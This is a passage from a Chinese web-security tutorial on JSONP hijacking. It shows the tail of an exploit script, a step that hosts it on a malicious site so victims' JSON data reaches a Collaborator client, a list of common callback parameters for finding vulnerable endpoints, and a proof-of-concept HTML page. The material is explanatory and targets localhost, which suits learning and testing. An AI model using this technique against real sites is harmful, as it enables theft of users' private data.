class="literal">true</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">   req.send();</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="comment">//jsonp接口</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/jsonp.php?jsonp=callback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.2.3 将脚本部署到恶意网站，并将网站链接发送给受害者，受害者访问链接，即可在collaborator client中获取到用户的json数据。</p><p><img src="2.1.5.png" alt="2.1.5"></p><h3 id="2-3-jsonp挖掘思路"><a href="#2-3-jsonp挖掘思路" class="headerlink" title="2.3  jsonp挖掘思路"></a>2.3  jsonp挖掘思路</h3><p>知道了应用场景，也知道利用流程，此时就应该思考怎么利用jsonp漏洞了</p><p>工具挖掘可以使用xray，xray自带有jsonp漏洞检测功能，监听端口，被动扫描就完事</p><p>手工挖掘也有一些小技巧，大佬总结的jsonp接口常用参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cb</span><br><span class="line">callback</span><br><span class="line">jsoncb</span><br><span class="line">jsonpcb</span><br><span class="line">jsonp</span><br><span class="line">jQuery</span><br><span class="line">jsoncallback</span><br><span class="line">jsonpcallback</span><br><span class="line">jsoncall</span><br><span class="line">jsonpcall</span><br></pre></td></tr></table></figure><p>访问网站首页</p><p><img src="2.1.6.png" alt="2.1.6"></p><ol><li><p>打开network</p></li><li><p>勾选Preserver log</p></li><li><p>在搜索框中搜索常用jsonp参数</p></li></ol><p>搜索到带有相关参数的链接，即可使用exp验证是否存在jsonp泄露。</p><p>验证poc:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>jsonp劫持验证示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">table</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>:inline</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">json</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(json);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> s=<span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="javascript">s.type=<span class="string">&quot;text/javascript&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//漏洞可能存在点</span></span></span><br><span class="line"><span class="javascript">s.src=<span class="string">&#x27;http://127.0.0.1/jsonp.php?jsonp=callback&#x27;</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(s);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="2.1.7.png" alt="2.1.7"></p><p>console.log获取到数据，说明存在该漏洞</p><p>参考链接：</p><p><a href="https://blog.knownsec.com/2015/03/jsonp_security_technic/">https://blog.knownsec.com/2015/03/jsonp_security_technic/</a></p><p><a href="https://mp.weixin.qq.com/s/SuEpF3RIZIv2CcIUok8SoQ">https://mp.weixin.qq.com/s/SuEpF3RIZIv2CcIUok8SoQ</a></p><p><a href="https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/">https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨域 </tag>
            
            <tag> cors </tag>
            
            <tag> jsonp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
